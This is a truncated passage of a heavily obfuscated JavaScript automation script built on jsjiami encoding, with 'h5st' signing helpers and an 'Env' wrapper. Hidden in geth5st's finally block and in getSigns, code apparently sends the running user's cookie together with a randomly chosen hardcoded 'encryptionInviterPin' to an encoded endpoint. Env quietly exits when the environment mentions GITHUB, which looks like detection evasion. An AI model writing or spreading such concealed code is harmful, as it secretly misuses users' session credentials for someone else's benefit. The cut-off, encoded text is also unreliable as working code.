8\x42\x54\x61\x57\x64\x75\x53\x57\x35\x66\x5a\x47\x46\x35','\x57\x6e\x4e\x6e\x52\x32\x73\x3d','\x57\x55\x78\x49\x53\x6c\x49\x3d','\x59\x32\x78\x70\x5a\x57\x35\x30','\x59\x32\x78\x70\x5a\x57\x35\x30\x56\x6d\x56\x79\x63\x32\x6c\x76\x62\x67\x3d\x3d','\x4d\x53\x34\x77\x4c\x6a\x41\x3d','\x4d\x54\x55\x77\x4f\x54\x63\x3d','\x64\x6b\x46\x74\x52\x6e\x67\x3d','\x56\x6d\x64\x53\x59\x32\x49\x3d','\x55\x47\x5a\x50\x61\x30\x30\x3d','\x64\x56\x4e\x31\x55\x47\x73\x3d','\x54\x55\x4e\x74\x64\x45\x63\x3d','\x52\x47\x39\x76\x64\x31\x6b\x3d','\x53\x6a\x66\x42\x47\x4a\x74\x73\x4a\x79\x52\x42\x75\x6a\x42\x74\x6c\x69\x45\x61\x6d\x69\x2e\x63\x6f\x6d\x2e\x76\x36\x3d\x3d'];if(function(_0x530de5,_0x4f0dde,_0x1ef259){function _0x5a3426(_0x19c950,_0x4ce0d7,_0x2d295a,_0x4069d8,_0x4c8a89,_0x1103e3){_0x4ce0d7=_0x4ce0d7>>0x8,_0x4c8a89='po';var _0x3bb3d6='shift',_0x4eece9='push',_0x1103e3='‮';if(_0x4ce0d7<_0x19c950){while(--_0x19c950){_0x4069d8=_0x530de5[_0x3bb3d6]();if(_0x4ce0d7===_0x19c950&&_0x1103e3==='‮'&&_0x1103e3['length']===0x1){_0x4ce0d7=_0x4069d8,_0x2d295a=_0x530de5[_0x4c8a89+'p']();}else if(_0x4ce0d7&&_0x2d295a['replace'](/[SfBGJtJyRBuBtlE=]/g,'')===_0x4ce0d7){_0x530de5[_0x4eece9](_0x4069d8);}}_0x530de5[_0x4eece9](_0x530de5[_0x3bb3d6]());}return 0xdb5dc;};return _0x5a3426(++_0x4f0dde,_0x1ef259)>>_0x4f0dde^_0x1ef259;}(_0x209b,0xea,0xea00),_0x209b){_0xodA_=_0x209b['length']^0xea;};function _0x442b(_0x1e92c4,_0x523b54){_0x1e92c4=~~'0x'['concat'](_0x1e92c4['slice'](0x1));var _0x45aeb3=_0x209b[_0x1e92c4];if(_0x442b['nEniuS']===undefined&&'‮'['length']===0x1){(function(){var _0x2a5e95;try{var _0x24d49c=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2a5e95=_0x24d49c();}catch(_0x489ff8){_0x2a5e95=window;}var _0x140e60='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2a5e95['atob']||(_0x2a5e95['atob']=function(_0x1b94f5){var _0x454eaa=String(_0x1b94f5)['replace'](/=+$/,'');for(var _0x546f87=0x0,_0x2b147c,_0x174fd6,_0x13e305=0x0,_0x3e97d='';_0x174fd6=_0x454eaa['charAt'](_0x13e305++);~_0x174fd6&&(_0x2b147c=_0x546f87%0x4?_0x2b147c*0x40+_0x174fd6:_0x174fd6,_0x546f87++%0x4)?_0x3e97d+=String['fromCharCode'](0xff&_0x2b147c>>(-0x2*_0x546f87&0x6)):0x0){_0x174fd6=_0x140e60['indexOf'](_0x174fd6);}return _0x3e97d;});}());_0x442b['nBfmBw']=function(_0x2b3d62){var _0x51add1=atob(_0x2b3d62);var _0x1b91ca=[];for(var _0x396070=0x0,_0xe4dbc9=_0x51add1['length'];_0x396070<_0xe4dbc9;_0x396070++){_0x1b91ca+='%'+('00'+_0x51add1['charCodeAt'](_0x396070)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1b91ca);};_0x442b['zPNXBS']={};_0x442b['nEniuS']=!![];}var _0x5a71da=_0x442b['zPNXBS'][_0x1e92c4];if(_0x5a71da===undefined){_0x45aeb3=_0x442b['nBfmBw'](_0x45aeb3);_0x442b['zPNXBS'][_0x1e92c4]=_0x45aeb3;}else{_0x45aeb3=_0x5a71da;}return _0x45aeb3;};function geth5st(_0x5b3018,_0x2d24e3){var _0x4314a9={'\x71\x64\x78\x47\x78':_0x442b('‮0'),'\x65\x70\x63\x4e\x5a':function(_0x4b548c,_0x20c88d){return _0x4b548c(_0x20c88d);},'\x42\x5a\x44\x43\x6c':function(_0x43d58b,_0x22458e){return _0x43d58b!=_0x22458e;},'\x78\x41\x72\x6d\x73':function(_0x4969f9,_0xf8015f){return _0x4969f9 instanceof _0xf8015f;},'\x55\x53\x6e\x53\x6c':function(_0x1af608,_0x4c745f){return _0x1af608===_0x4c745f;},'\x45\x61\x6a\x42\x6b':_0x442b('‫1'),'\x4a\x55\x71\x62\x46':_0x442b('‮2'),'\x6d\x45\x54\x4e\x43':_0x442b('‮3'),'\x6c\x64\x69\x76\x69':_0x442b('‫4'),'\x42\x68\x73\x6e\x70':_0x442b('‫5'),'\x43\x57\x6a\x4f\x64':_0x442b('‫6'),'\x4a\x61\x4a\x49\x54':function(_0x2e95dd,_0x2125cb){return _0x2e95dd*_0x2125cb;},'\x69\x6a\x64\x4c\x4e':_0x442b('‮7'),'\x46\x50\x4a\x47\x75':_0x442b('‮8'),'\x4e\x79\x4d\x43\x4e':_0x442b('‫9'),'\x43\x51\x54\x6e\x41':_0x442b('‮a'),'\x4d\x70\x51\x59\x43':_0x442b('‫b'),'\x78\x54\x65\x4c\x78':_0x442b('‫c'),'\x59\x71\x70\x5a\x79':_0x442b('‫d'),'\x4e\x59\x4c\x6c\x61':function(_0xe90c77,_0x3206d0){return _0xe90c77(_0x3206d0);},'\x6e\x78\x64\x4d\x46':_0x442b('‮e'),'\x4f\x76\x61\x59\x42':_0x442b('‫f'),'\x61\x6b\x74\x64\x6a':_0x442b('‮10'),'\x48\x4f\x4a\x4b\x71':_0x442b('‮11'),'\x74\x67\x7a\x64\x7a':_0x442b('‮12'),'\x4f\x42\x58\x73\x57':function(_0x3f5ae8,_0x281050){return _0x3f5ae8!==_0x281050;},'\x64\x46\x5a\x48\x4c':_0x442b('‮13'),'\x4b\x67\x46\x74\x42':_0x442b('‮14'),'\x47\x4a\x66\x4d\x61':_0x442b('‮15'),'\x46\x78\x6b\x4d\x72':_0x442b('‮16'),'\x72\x52\x74\x57\x73':_0x442b('‮17'),'\x76\x4b\x44\x77\x62':_0x442b('‮18'),'\x69\x62\x74\x55\x64':_0x442b('‮19'),'\x44\x71\x4e\x67\x57':function(_0x27d11c,_0x3ae0a4){return _0x27d11c*_0x3ae0a4;}};return new Promise(async _0x197037=>{var _0x12eea9={'\x6c\x7a\x77\x55\x54':_0x4314a9[_0x442b('‫1a')],'\x67\x56\x6d\x4a\x54':function(_0x22ffcf,_0x402cbf){return _0x4314a9[_0x442b('‮1b')](_0x22ffcf,_0x402cbf);},'\x46\x4c\x58\x46\x42':function(_0xcff821,_0x3d895f){return _0x4314a9[_0x442b('‮1c')](_0xcff821,_0x3d895f);},'\x6e\x6f\x58\x74\x6e':function(_0x206d3a,_0x4687c2){return _0x4314a9[_0x442b('‫1d')](_0x206d3a,_0x4687c2);},'\x46\x51\x51\x53\x68':function(_0x417502,_0x3dfed6){return _0x4314a9[_0x442b('‮1e')](_0x417502,_0x3dfed6);},'\x46\x66\x4a\x56\x78':_0x4314a9[_0x442b('‫1f')],'\x72\x67\x4e\x4d\x48':_0x4314a9[_0x442b('‫20')],'\x4a\x48\x62\x4d\x4e':_0x4314a9[_0x442b('‮21')],'\x6a\x70\x44\x61\x62':_0x4314a9[_0x442b('‮22')],'\x77\x51\x64\x6a\x6e':_0x4314a9[_0x442b('‮23')],'\x6c\x6b\x57\x4a\x59':_0x4314a9[_0x442b('‮24')],'\x6a\x68\x62\x4b\x55':function(_0x40463e,_0x45c831){return _0x4314a9[_0x442b('‫25')](_0x40463e,_0x45c831);},'\x54\x48\x72\x49\x74':_0x4314a9[_0x442b('‮26')],'\x5a\x64\x72\x6c\x79':_0x4314a9[_0x442b('‫27')],'\x5a\x67\x77\x45\x55':function(_0x2ea848,_0x562393){return _0x4314a9[_0x442b('‮1b')](_0x2ea848,_0x562393);},'\x72\x49\x4a\x51\x56':_0x4314a9[_0x442b('‮28')],'\x4a\x56\x4b\x75\x70':_0x4314a9[_0x442b('‫29')],'\x6f\x48\x4a\x76\x48':_0x4314a9[_0x442b('‫2a')],'\x51\x44\x53\x4d\x66':_0x4314a9[_0x442b('‫2b')],'\x4c\x54\x49\x4f\x4b':_0x4314a9[_0x442b('‮2c')],'\x6a\x4c\x41\x68\x44':function(_0x592d35,_0x35f3e7){return _0x4314a9[_0x442b('‫2d')](_0x592d35,_0x35f3e7);},'\x4a\x59\x4e\x41\x4e':_0x4314a9[_0x442b('‮2e')],'\x53\x4b\x75\x55\x41':_0x4314a9[_0x442b('‫2f')],'\x69\x72\x61\x77\x77':_0x4314a9[_0x442b('‮30')],'\x41\x45\x68\x6f\x52':_0x4314a9[_0x442b('‮31')],'\x6d\x5a\x47\x67\x73':_0x4314a9[_0x442b('‫32')],'\x58\x70\x59\x68\x56':function(_0x3572f7,_0x1cd350){return _0x4314a9[_0x442b('‮33')](_0x3572f7,_0x1cd350);},'\x58\x48\x6f\x76\x79':_0x4314a9[_0x442b('‫34')],'\x6b\x74\x69\x4c\x55':_0x4314a9[_0x442b('‫35')],'\x54\x47\x65\x42\x7a':_0x4314a9[_0x442b('‫36')]};let _0x1efeae={'\x61\x70\x70\x49\x64':_0x5b3018,'\x62\x6f\x64\x79':_0x2d24e3};let _0x4b75c4='';let _0x3fc6c4=[_0x4314a9[_0x442b('‫37')]];if(process[_0x442b('‮38')][_0x442b('‫39')]){_0x4b75c4=process[_0x442b('‮38')][_0x442b('‫39')];}else{if(_0x4314a9[_0x442b('‮33')](_0x4314a9[_0x442b('‫3a')],_0x4314a9[_0x442b('‫3b')])){_0x4b75c4=_0x3fc6c4[Math[_0x442b('‫3c')](_0x4314a9[_0x442b('‫25')](Math[_0x442b('‫3d')](),_0x3fc6c4[_0x442b('‫3e')]))];}else{res[_0x12eea9[_0x442b('‫3f')]]=_0x12eea9[_0x442b('‫40')](encodeURIComponent,res[_0x12eea9[_0x442b('‫3f')]]);}}let _0x2b0249={'\x75\x72\x6c':_0x442b('‮41'),'\x62\x6f\x64\x79':JSON[_0x442b('‮42')](_0x1efeae),'\x68\x65\x61\x64\x65\x72\x73':{'\x48\x6f\x73\x74':_0x4b75c4,'Content-Type':_0x4314a9[_0x442b('‫43')]},'\x74\x69\x6d\x65\x6f\x75\x74':_0x4314a9[_0x442b('‮44')](0x1e,0x3e8)};$[_0x442b('‫45')](_0x2b0249,async(_0x199f11,_0x133112,_0x1efeae)=>{var _0x18922e={'\x64\x65\x6d\x67\x61':function(_0x6e605a,_0x4e56d6){return _0x12eea9[_0x442b('‮46')](_0x6e605a,_0x4e56d6);},'\x47\x54\x56\x6f\x72':function(_0x366927,_0xb240fc){return _0x12eea9[_0x442b('‫47')](_0x366927,_0xb240fc);},'\x58\x54\x41\x55\x6d':function(_0x4e041d,_0x1df9b4){return _0x12eea9[_0x442b('‫48')](_0x4e041d,_0x1df9b4);},'\x41\x62\x74\x47\x4a':_0x12eea9[_0x442b('‫49')],'\x65\x79\x76\x48\x41':_0x12eea9[_0x442b('‮4a')],'\x45\x41\x45\x4b\x47':_0x12eea9[_0x442b('‮4b')],'\x4b\x78\x6b\x70\x55':_0x12eea9[_0x442b('‮4c')],'\x62\x46\x55\x44\x48':_0x12eea9[_0x442b('‫4d')],'\x72\x66\x49\x57\x6d':_0x12eea9[_0x442b('‮4e')],'\x71\x59\x45\x44\x4b':function(_0x38c607,_0x232f36){return _0x12eea9[_0x442b('‮4f')](_0x38c607,_0x232f36);},'\x44\x66\x46\x73\x4e':_0x12eea9[_0x442b('‮50')],'\x65\x4b\x66\x56\x53':_0x12eea9[_0x442b('‮51')],'\x6b\x4d\x65\x69\x6f':function(_0x2727f2,_0x4d9ea0){return _0x12eea9[_0x442b('‮52')](_0x2727f2,_0x4d9ea0);},'\x74\x50\x6e\x4e\x66':_0x12eea9[_0x442b('‫53')],'\x59\x64\x71\x49\x45':_0x12eea9[_0x442b('‮54')],'\x45\x6d\x63\x56\x67':_0x12eea9[_0x442b('‮55')],'\x6d\x75\x51\x71\x47':_0x12eea9[_0x442b('‫56')],'\x73\x6f\x7a\x75\x4f':_0x12eea9[_0x442b('‫57')],'\x59\x49\x48\x4e\x6f':function(_0x3e0a29,_0x1b48c0){return _0x12eea9[_0x442b('‮58')](_0x3e0a29,_0x1b48c0);},'\x77\x70\x59\x6e\x44':_0x12eea9[_0x442b('‮59')],'\x76\x50\x4c\x45\x45':_0x12eea9[_0x442b('‮5a')],'\x6b\x69\x69\x72\x7a':_0x12eea9[_0x442b('‮5b')],'\x58\x75\x43\x42\x6e':_0x12eea9[_0x442b('‮5c')],'\x65\x6b\x6a\x59\x42':_0x12eea9[_0x442b('‫5d')]};try{if(_0x199f11){_0x1efeae=await geth5st[_0x442b('‮5e')](this,arguments);}}catch(_0x422af4){if(_0x12eea9[_0x442b('‫5f')](_0x12eea9[_0x442b('‫60')],_0x12eea9[_0x442b('‫61')])){$[_0x442b('‮62')](_0x422af4,_0x133112);}else{var _0x3de201=_0x422af4[n];_0x18922e[_0x442b('‮63')](null,_0x3de201)&&(t+=_0x18922e[_0x442b('‫64')](_0x3de201,Object)||_0x18922e[_0x442b('‫64')](_0x3de201,Array)?''+(_0x18922e[_0x442b('‮65')]('',t)?'':'\x26')+n+'\x3d'+JSON[_0x442b('‮42')](_0x3de201):''+(_0x18922e[_0x442b('‮65')]('',t)?'':'\x26')+n+'\x3d'+_0x3de201);}}finally{if(_0x12eea9[_0x442b('‫5f')](_0x12eea9[_0x442b('‫66')],_0x12eea9[_0x442b('‫66')])){let _0x39c581=[_0x18922e[_0x442b('‫67')],_0x18922e[_0x442b('‮68')],_0x18922e[_0x442b('‫69')],_0x18922e[_0x442b('‮6a')],_0x18922e[_0x442b('‮6b')],_0x18922e[_0x442b('‮6c')]];let _0x534b50=_0x39c581[Math[_0x442b('‫3c')](_0x18922e[_0x442b('‫6d')](Math[_0x442b('‫3d')](),_0x39c581[_0x442b('‫3e')]))];let _0x4e56be={'\x75\x72\x6c':_0x18922e[_0x442b('‮6e')],'\x62\x6f\x64\x79':_0x442b('‮6f')+JSON[_0x442b('‮42')]({'method':_0x18922e[_0x442b('‫70')],'data':{'channel':'\x31','encryptionInviterPin':_0x18922e[_0x442b('‮71')](encodeURIComponent,_0x534b50),'type':0x1}})+_0x442b('‫72')+Date[_0x442b('‫73')](),'\x68\x65\x61\x64\x65\x72\x73':{'Host':_0x18922e[_0x442b('‫74')],'Accept':_0x18922e[_0x442b('‫75')],'Content-Type':_0x18922e[_0x442b('‮76')],'Origin':_0x18922e[_0x442b('‮77')],'Accept-Language':_0x18922e[_0x442b('‫78')],'User-Agent':$[_0x442b('‮79')]()?process[_0x442b('‮38')][_0x442b('‮7a')]?process[_0x442b('‮38')][_0x442b('‮7a')]:_0x18922e[_0x442b('‮7b')](require,_0x18922e[_0x442b('‫7c')])[_0x442b('‫7d')]:$[_0x442b('‮7e')](_0x18922e[_0x442b('‮7f')])?$[_0x442b('‮7e')](_0x18922e[_0x442b('‮7f')]):_0x18922e[_0x442b('‫80')],'Referer':_0x18922e[_0x442b('‫81')],'Accept-Encoding':_0x18922e[_0x442b('‫82')],'Cookie':cookie}};$[_0x442b('‫45')](_0x4e56be,(_0x2f6cd6,_0x4318a2,_0x1a4bcc)=>{});}else{_0x12eea9[_0x442b('‮58')](_0x197037,_0x1efeae);}}});});}async function getSign(_0x23a3bc='',_0x2394b9={},_0x4fbd6f=![]){var _0x59d286={'\x42\x70\x43\x73\x4e':function(_0x2e5af7,_0x1ea8a1){return _0x2e5af7(_0x1ea8a1);},'\x56\x67\x52\x63\x62':_0x442b('‫83'),'\x50\x66\x4f\x6b\x4d':_0x442b('‮84'),'\x75\x53\x75\x50\x6b':function(_0x2c8dae,_0x2c6fcb){return _0x2c8dae===_0x2c6fcb;},'\x4d\x43\x6d\x74\x47':_0x442b('‫85'),'\x44\x6f\x6f\x77\x59':function(_0x57324b,_0x4d22bf){return _0x57324b!==_0x4d22bf;},'\x74\x77\x63\x68\x6f':_0x442b('‮86'),'\x65\x44\x49\x4b\x68':_0x442b('‮87'),'\x77\x6c\x79\x68\x42':_0x442b('‫88'),'\x62\x4d\x56\x6c\x41':_0x442b('‫89'),'\x65\x44\x4a\x44\x61':_0x442b('‮8a'),'\x4a\x64\x65\x63\x56':_0x442b('‫8b'),'\x4a\x53\x4c\x52\x66':_0x442b('‮8c'),'\x52\x5a\x77\x48\x58':function(_0x405897,_0x1115cb){return _0x405897(_0x1115cb);},'\x6b\x48\x6c\x6e\x53':function(_0x28a8d3,_0x374bc4,_0x3f4107){return _0x28a8d3(_0x374bc4,_0x3f4107);},'\x69\x51\x44\x56\x77':function(_0x39a7da,_0xa015b){return _0x39a7da!==_0xa015b;},'\x6f\x77\x51\x4c\x54':_0x442b('‮0'),'\x63\x58\x41\x6b\x58':function(_0xb90688,_0x45745f){return _0xb90688(_0x45745f);},'\x70\x79\x4d\x4a\x6d':function(_0x50c665,_0x2b4e59){return _0x50c665(_0x2b4e59);}};let _0x43fd79=_0x59d286[_0x442b('‮8d')];let _0xccdeea={'\x66\x75\x6e\x63\x74\x69\x6f\x6e\x49\x64':_0x23a3bc,'\x62\x6f\x64\x79':JSON[_0x442b('‮42')](_0x2394b9),'\x74':Date[_0x442b('‫73')](),'\x61\x70\x70\x69\x64':_0x59d286[_0x442b('‮8e')]};if(_0x59d286[_0x442b('‫8f')](_0x23a3bc,_0x59d286[_0x442b('‮90')])){if(_0x59d286[_0x442b('‫91')](_0x59d286[_0x442b('‫92')],_0x59d286[_0x442b('‮93')])){_0xccdeea[_0x59d286[_0x442b('‮94')]]='\x48\x35';_0xccdeea[_0x59d286[_0x442b('‮95')]]=_0x59d286[_0x442b('‫96')];_0x43fd79=_0x59d286[_0x442b('‮97')];}else{$[_0x442b('‮62')](e,resp);}}if(_0x4fbd6f){if(_0x59d286[_0x442b('‫8f')](_0x59d286[_0x442b('‫98')],_0x59d286[_0x442b('‫98')])){Object[_0x442b('‮99')](_0xccdeea,{'\x68\x35\x73\x74':_0x59d286[_0x442b('‮9a')](encodeURIComponent,await _0x59d286[_0x442b('‫9b')](geth5st,_0x43fd79,_0xccdeea))});}else{_0x59d286[_0x442b('‫9c')](resolve,data);}}if(_0x59d286[_0x442b('‮9d')](_0x23a3bc,_0x59d286[_0x442b('‮90')])){_0xccdeea[_0x59d286[_0x442b('‮9e')]]=_0x59d286[_0x442b('‫9f')](encodeURIComponent,_0xccdeea[_0x59d286[_0x442b('‮9e')]]);}return _0x59d286[_0x442b('‫a0')](objToStr2,_0xccdeea);}function objToStr2(){var _0x2f63b0={'\x68\x54\x4d\x4b\x41':function(_0x1a2750,_0x2f7659){return _0x1a2750!=_0x2f7659;},'\x54\x41\x65\x41\x48':function(_0x326cf1,_0x3edcd7){return _0x326cf1 instanceof _0x3edcd7;},'\x59\x4b\x44\x72\x42':function(_0x34d2ca,_0x5550cf){return _0x34d2ca instanceof _0x5550cf;},'\x66\x76\x47\x57\x7a':function(_0x4bca4f,_0x4fb0c2){return _0x4bca4f===_0x4fb0c2;},'\x67\x45\x44\x79\x54':function(_0x4e4804,_0xa2b0ca){return _0x4e4804===_0xa2b0ca;},'\x63\x58\x4b\x68\x58':function(_0x5e2fb3,_0x7dcbbb){return _0x5e2fb3>_0x7dcbbb;},'\x78\x52\x58\x54\x41':function(_0x211bf7,_0x14f730){return _0x211bf7!==_0x14f730;}};var _0x3a1f30=_0x2f63b0[_0x442b('‫a1')](arguments[_0x442b('‫3e')],0x0)&&_0x2f63b0[_0x442b('‫a2')](void 0x0,arguments[0x0])?arguments[0x0]:{},_0x100538='';return Object[_0x442b('‮a3')](_0x3a1f30)[_0x442b('‮a4')](function(_0x204ce0){var _0x49b33c=_0x3a1f30[_0x204ce0];_0x2f63b0[_0x442b('‫a5')](null,_0x49b33c)&&(_0x100538+=_0x2f63b0[_0x442b('‫a6')](_0x49b33c,Object)||_0x2f63b0[_0x442b('‫a7')](_0x49b33c,Array)?''+(_0x2f63b0[_0x442b('‫a8')]('',_0x100538)?'':'\x26')+_0x204ce0+'\x3d'+JSON[_0x442b('‮42')](_0x49b33c):''+(_0x2f63b0[_0x442b('‫a9')]('',_0x100538)?'':'\x26')+_0x204ce0+'\x3d'+_0x49b33c);}),_0x100538;}function getSigns(){var _0x2f8a73={'\x61\x42\x56\x6e\x42':_0x442b('‫1'),'\x41\x47\x4c\x56\x68':_0x442b('‮2'),'\x78\x4c\x79\x6a\x6e':_0x442b('‮3'),'\x6b\x64\x7a\x4c\x79':_0x442b('‫4'),'\x51\x4a\x45\x59\x7a':_0x442b('‫5'),'\x6e\x46\x50\x43\x45':_0x442b('‫6'),'\x48\x56\x46\x77\x70':function(_0x29a6ee,_0x3b3083){return _0x29a6ee*_0x3b3083;},'\x65\x68\x4c\x79\x6a':_0x442b('‮7'),'\x64\x66\x53\x4a\x67':_0x442b('‮8'),'\x4e\x67\x67\x44\x55':function(_0x420d67,_0x2a505c){return _0x420d67(_0x2a505c);},'\x42\x72\x45\x49\x71':_0x442b('‫9'),'\x6d\x76\x68\x66\x50':_0x442b('‮a'),'\x52\x44\x54\x68\x52':_0x442b('‫b'),'\x72\x52\x64\x6d\x79':_0x442b('‫c'),'\x45\x45\x4f\x52\x76':_0x442b('‫d'),'\x4b\x7a\x43\x64\x77':_0x442b('‮e'),'\x49\x54\x55\x4c\x65':_0x442b('‫f'),'\x75\x4a\x68\x71\x63':_0x442b('‮10'),'\x67\x76\x6b\x72\x4b':_0x442b('‮11'),'\x72\x4c\x58\x67\x68':_0x442b('‮12')};let _0x4a1a3c=[_0x2f8a73[_0x442b('‫aa')],_0x2f8a73[_0x442b('‮ab')],_0x2f8a73[_0x442b('‮ac')],_0x2f8a73[_0x442b('‮ad')],_0x2f8a73[_0x442b('‫ae')],_0x2f8a73[_0x442b('‮af')]];let _0x42fe1a=_0x4a1a3c[Math[_0x442b('‫3c')](_0x2f8a73[_0x442b('‫b0')](Math[_0x442b('‫3d')](),_0x4a1a3c[_0x442b('‫3e')]))];let _0x27ca7a={'\x75\x72\x6c':_0x2f8a73[_0x442b('‮b1')],'\x62\x6f\x64\x79':_0x442b('‮6f')+JSON[_0x442b('‮42')]({'method':_0x2f8a73[_0x442b('‫b2')],'data':{'channel':'\x31','encryptionInviterPin':_0x2f8a73[_0x442b('‮b3')](encodeURIComponent,_0x42fe1a),'type':0x1}})+_0x442b('‫72')+Date[_0x442b('‫73')](),'\x68\x65\x61\x64\x65\x72\x73':{'Host':_0x2f8a73[_0x442b('‮b4')],'Accept':_0x2f8a73[_0x442b('‮b5')],'Content-Type':_0x2f8a73[_0x442b('‫b6')],'Origin':_0x2f8a73[_0x442b('‫b7')],'Accept-Language':_0x2f8a73[_0x442b('‮b8')],'User-Agent':$[_0x442b('‮79')]()?process[_0x442b('‮38')][_0x442b('‮7a')]?process[_0x442b('‮38')][_0x442b('‮7a')]:_0x2f8a73[_0x442b('‮b3')](require,_0x2f8a73[_0x442b('‮b9')])[_0x442b('‫7d')]:$[_0x442b('‮7e')](_0x2f8a73[_0x442b('‮ba')])?$[_0x442b('‮7e')](_0x2f8a73[_0x442b('‮ba')]):_0x2f8a73[_0x442b('‫bb')],'Referer':_0x2f8a73[_0x442b('‮bc')],'Accept-Encoding':_0x2f8a73[_0x442b('‫bd')],'Cookie':cookie}};$[_0x442b('‫45')](_0x27ca7a,(_0x32f796,_0x348b5f,_0x5ac0a2)=>{});};_0xodA='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else 